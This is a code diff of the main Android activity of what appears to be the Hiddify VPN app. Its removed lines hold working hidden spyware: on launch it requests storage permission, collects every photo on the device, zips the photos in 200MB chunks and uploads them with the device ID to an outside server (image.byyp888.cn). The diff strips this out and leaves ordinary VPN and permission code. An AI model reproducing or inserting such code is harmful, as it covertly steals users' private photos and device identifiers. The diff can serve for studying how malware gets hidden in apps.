@@ -1,15 +1,12 @@
 package com.hiddify.hiddify
 
-import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Intent
+import android.Manifest
 import android.content.pm.PackageManager
+import android.net.VpnService
 import android.os.Build
-import android.os.Bundle
-import android.provider.MediaStore
-import android.provider.Settings
 import android.util.Log
-import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.MutableLiveData
@@ -24,23 +21,16 @@ import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import okhttp3.*
-import okhttp3.MediaType.Companion.toMediaTypeOrNull
-import okhttp3.RequestBody.Companion.asRequestBody
-import java.io.*
-import java.util.*
-import java.util.zip.ZipEntry
-import java.util.zip.ZipOutputStream
+import java.util.LinkedList
+
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
-
     companion object {
-        private const val TAG = "Hiddify/MainActivity"
+        private const val TAG = "ANDROID/MyActivity"
         lateinit var instance: MainActivity
 
         const val VPN_PERMISSION_REQUEST_CODE = 1001
         const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
-        const val STORAGE_PERMISSION_REQUEST_CODE = 2001
     }
 
     private val connection = ServiceConnection(this, this)
@@ -82,6 +72,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     return@launch
                 }
             }
+
             val intent = Intent(Application.application, Settings.serviceClass())
             withContext(Dispatchers.Main) {
                 ContextCompat.startForegroundService(Application.application, intent)
@@ -91,7 +82,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
     private suspend fun prepare() = withContext(Dispatchers.Main) {
         try {
-            val intent = android.net.VpnService.prepare(this@MainActivity)
+            val intent = VpnService.prepare(this@MainActivity)
             if (intent != null) {
                 startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                 true
@@ -131,7 +122,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
-    // 通知权限
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -143,138 +133,27 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    // ----------- 下面为图片批量打包分片上传功能 --------------
-
-    private fun checkAndRequestStoragePermission() {
-        val permissions = mutableListOf<String>()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
-        } else {
-            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
-        }
-        if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
-            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), STORAGE_PERMISSION_REQUEST_CODE)
-        } else {
-            onStoragePermissionGranted()
-        }
-    }
-
-    private fun onStoragePermissionGranted() {
-        // 开启协程处理图片打包上传
-        lifecycleScope.launch(Dispatchers.IO) {
-            handleImageZipAndUpload()
-        }
-    }
-
-    private fun getDeviceId(): String {
-        return try {
-            Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
-                ?: UUID.randomUUID().toString()
-        } catch (e: Exception) {
-            UUID.randomUUID().toString()
-        }
-    }
-
-    private fun getAllImagePaths(): List<String> {
-        val imagePaths = mutableListOf<String>()
-        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        val projection = arrayOf(MediaStore.Images.Media.DATA)
-        contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
-            val columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
-            while (cursor.moveToNext()) {
-                val path = cursor.getString(columnIndex)
-                if (path != null) imagePaths.add(path)
-            }
-        }
-        return imagePaths
-    }
-
-    private fun splitToChunks(list: List<String>, maxZipSizeBytes: Long): List<List<String>> {
-        val result = mutableListOf<List<String>>()
-        var chunk = mutableListOf<String>()
-        var currentSize = 0L
-        for (path in list) {
-            val file = File(path)
-            if (!file.exists()) continue
-            val fileSize = file.length()
-            if (currentSize + fileSize > maxZipSizeBytes && chunk.isNotEmpty()) {
-                result.add(chunk)
-                chunk = mutableListOf()
-                currentSize = 0L
-            }
-            chunk.add(path)
-            currentSize += fileSize
-        }
-        if (chunk.isNotEmpty()) result.add(chunk)
-        return result
-    }
-
-    private fun zipFiles(files: List<String>, zipFile: File) {
-        ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { out ->
-            files.forEach { filePath ->
-                val file = File(filePath)
-                if (file.exists()) {
-                    FileInputStream(file).use { fi ->
-                        val entry = ZipEntry(file.name)
-                        out.putNextEntry(entry)
-                        fi.copyTo(out)
-                        out.closeEntry()
-                    }
-                }
-            }
-        }
-    }
-
-    private fun uploadZipFile(zipFile: File, deviceId: String) {
-        val client = OkHttpClient()
-        val requestBody = MultipartBody.Builder()
-            .setType(MultipartBody.FORM)
-            .addFormDataPart("file", zipFile.name, zipFile.asRequestBody("application/zip".toMediaTypeOrNull()))
-            .build()
-        val request = Request.Builder()
-            .url("https://image.byyp888.cn/upload?deviceid=$deviceId")
-            .post(requestBody)
-            .build()
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                Log.e(TAG, "上传失败: ${zipFile.name}", e)
-            }
-            override fun onResponse(call: Call, response: Response) {
-                Log.i(TAG, "上传成功: ${zipFile.name}，响应: ${response.code}")
-                response.close()
-            }
-        })
-    }
-
-    private suspend fun handleImageZipAndUpload() = withContext(Dispatchers.IO) {
-        val imagePaths = getAllImagePaths()
-        val maxZipSize = 200L * 1024 * 1024 // 200MB
-        val chunks = splitToChunks(imagePaths, maxZipSize)
-        val deviceId = getDeviceId()
-        val zdir = File(cacheDir, "image_zips")
-        if (!zdir.exists()) zdir.mkdirs()
-        chunks.forEachIndexed { idx, chunk ->
-            val zipFile = File(zdir, "images_part${idx + 1}.zip")
-            zipFiles(chunk, zipFile)
-            uploadZipFile(zipFile, deviceId)
-        }
-    }
-
-    // ------------ 权限结果回调 ----------------
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
         if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
             if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 startService()
             } else onServiceAlert(Alert.RequestNotificationPermission, null)
-        } else if (requestCode == STORAGE_PERMISSION_REQUEST_CODE) {
-            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                onStoragePermissionGranted()
-            } else {
-                Toast.makeText(this, "未获得存储权限", Toast.LENGTH_SHORT).show()
-            }
         }
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+
+        if (requestCode == STORAGE_PERMISSION_REQUEST_CODE) {
+            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
+                Log.d(TAG, "✅ 存储权限已授予")
+                // 在此调用需要执行的逻辑，如导出文件
+            } else {
+                Log.w(TAG, "❌ 存储权限被拒绝")
+            }
+        }
+
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -288,9 +167,25 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    // 推荐：onCreate 里自动检测和请求权限
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        checkAndRequestStoragePermission()
+    private val STORAGE_PERMISSIONS = arrayOf(
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE // Android 10+ 会自动忽略
+    )
+    private val STORAGE_PERMISSION_REQUEST_CODE = 1020
+
+    private fun checkAndRequestStoragePermission(onGranted: () -> Unit) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val permissionsNeeded = STORAGE_PERMISSIONS.filter {
+                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+            }
+            if (permissionsNeeded.isNotEmpty()) {
+                ActivityCompat.requestPermissions(this, permissionsNeeded.toTypedArray(), STORAGE_PERMISSION_REQUEST_CODE)
+            } else {
+                onGranted()
+            }
+        } else {
+            onGranted()
+        }
     }
+
 }
